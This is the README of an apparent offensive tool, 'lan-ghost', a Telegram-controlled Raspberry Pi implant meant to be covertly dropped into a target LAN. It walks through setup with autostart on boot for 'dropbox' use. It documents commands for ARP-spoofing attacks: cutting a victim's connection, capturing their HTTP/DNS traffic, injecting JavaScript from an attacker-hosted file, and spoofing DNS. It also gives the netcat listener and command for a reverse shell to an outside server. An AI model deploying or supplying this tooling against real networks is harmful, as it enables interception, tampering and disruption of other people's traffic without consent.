# lan-ghost bot

[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/kraloveckey)

[![Telegram Channel](https://img.shields.io/badge/Telegram%20Channel-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/cyber_notes)

Telegram bot written on python that controlling LAN.

<h1>Features:</h1>
<p align=center>
<a href="https://github.com/kraloveckey/lan-ghost/blob/master/README.md"><img src="https://raw.githubusercontent.com/kraloveckey/lan-ghost/master/img/features.png"/></a>
</p>

<h1>Setup:</h1>

<p>lan-ghost is designed for <b>Raspberry Pi</b> (<b>Raspbian</b>/<b>Kali for RPi</b>). Running it on other/desktop distros could cause issues and may not work as excepted.</p>

You will need a **Raspberry Pi** with **fresh Raspbian/Kali** on the SD card, because you don't want anything else running in the background.

Boot up the Pi, get an SSH sell or connect a monitor and a keyboard and enter these commands:

```
$ sudo apt update && sudo apt install python3 python3-pip
$ git clone https://github.com/kraloveckey/lan-ghost.git
$ cd lan-ghost
$ sudo ./setup.py
```

Please **read** the questions/messages while running the setup script!

<h4>Step 1/4 - setup.py</h4>

```
[+] Please enter the name of the network interface connected/will
be connected to the target LAN. Default wired interface is 'eth0',
and the default wireless interface is 'wlan0' on most systems, but
you can check it in a different terminal with the 'ifconfig' command.
```

<h4>Step 2/4 - setup.py</h4>

```
[+] Please create a Telegram API key by messaging @BotFather on Telegram
with the command '/newbot'.

After this, @BotFather will ask you to choose a name for your bot.
This can be anything you want.

Lastly, @BotFather will ask you for a username for your bot. You have
to choose a unique username here which ends with 'bot'. For
example: xdavidbot. Make note of this username, since later
you will have to search for this to find your bot, which lanGhost
will be running on.

After you send your username of choise to @BotFather, you will recieve
your API key.
```

<h4>Step 3/4 - setup.py</h4>

```
[+] Now for lanGhost to only allow access to you, you need to verify yourself.

Send the verification code below TO THE BOT you just created. Just search for your
bot's @username (what you sent to @BotFather) to find it.

[+] Verification code to send: ******
```


<h4>Step 4/4 - setup.py</h4>

```
[+] Do you want lanGhost to start on boot? This option is necessary if you are using
this device as a dropbox, because when you are going to drop this device into a
network, you will not have the chanse to start lanGhost remotely! (autostart works
by adding a new cron '@reboot' entry)
```

<h3>If you are ready with the setup just reboot the Pi and lanGhost will start right up:</3>
<br><br>
<p>
<img src="img/screenshot-telegram.png"/>
</p>

<h1>Usage:</h1>

<p>Using lanGhost on a networks bigger than /24 is <b>not recommended</b> because the scans will take too long.</p>

<p>lanGhost is <b>not quiet</b>. Anyone monitoring the traffic can see the ARP packets!</p>

<h3>Drop it into a network:</h3>

If you have selected `yes` at `step 4/4 (autostart)` the Pi is fully set up for dropping. lanGhost should start up on boot, and send you a message on Telegram with the text: `lanGhost started! 👻`.

Make sure to try it out in your lab first and test if lanGhost is responding to your messages!

If you are all set, just connect it to the target network by plugging in the Ethernet cable into the Pi and connecting the power via micro USB and you are ready to go!

(lanGhost can also work over WiFi, but you will need to set up `wpa_supplicant` to connect to the network automatically first)

<h3>Available commands:</h3>

```
/scan - Scan LAN network
/scanip [TARGET-IP] - Scan a specific IP address.
/kill [TARGET-IP] - Stop the target's network connection.
/mitm [TARGET-IP] - Capture HTTP/DNS traffic from target.
/replaceimg [TARGET-IP] - Replace HTTP images requested by target.
/injectjs [TARGET-IP] [JS-FILE-URL] - Inject JavaScript into HTTP pages requested by target.
/spoofdns [TARGET-IP] [DOMAIN] [FAKE-IP] - Spoof DNS records for target.
/attacks - View currently running attacks.
/stop [ATTACK-ID] - Stop a currently running attack.
/restart - Restart lanGhost.
/reversesh [TARGET-IP] [PORT] - Create a netcat reverse shell to target.
/help - Display the help menu.
/ping - Pong.
```

<h3>Attack system:</h3>

You can start an attack by using one of these commands: `/kill, /mitm, /replaceimg, /injectjs, /spoofdns`

Ater you have one or more attacks running, you can use the `/attack` command to get a list of them containing the `ATTACK-ID`'s.

To stop an attack type `/stop [ATTACK-ID]`.

<h3>Reverse Shell:</h3>

<p><code>/reversesh</code> only makes a netcat TCP connection which is not encrypted and all the traffic can be monitored! Only use it for emergency fixes or for setting up an encrypted reverse connection if necessary.</p>

The `/reversesh` command is for getting a reverse shell on the Pi, when its not accessable from the outside.

To use the `/reversesh` command you will need to have a server listening for the shell.

Netcat command to start up the listener on your server:

```
$ nc -l 0.0.0.0 [PORT]
```

Telegram command:

```
/reversesh [IP-of-your-listening-server] [PORT]
```

<h3>Attacks:</h3>

  * `/kill` - Stops the internet connectivity for the target.
  * `/mitm` - Captures HTTP and DNS traffic from the target and sends it in text messages.
  * `/replaceimg` -  Replaces HTTP images for the target to what picture you send to the bot.
  * `/injectjs` - Injects JavaScript into every HTTP HTML response for the target. You need to host the the JS file on your server and give the URL as a parameter.
  * `/spoofdns` - Spoofs DNS responses for the target.

All attacks use **ARP Spoofing**!

<h3>Scans:</h3>

  * `/scan` - Scans the local network and returns the hosts online. Uses `nmap -sn` scan to discover hosts.
  * `/scanip` - Scans an IP address for open ports and other info. Uses `nmap -sS` scan.

<h3>Notifications:</h3>

You will get a message every time when a new device connects/leaves the network.
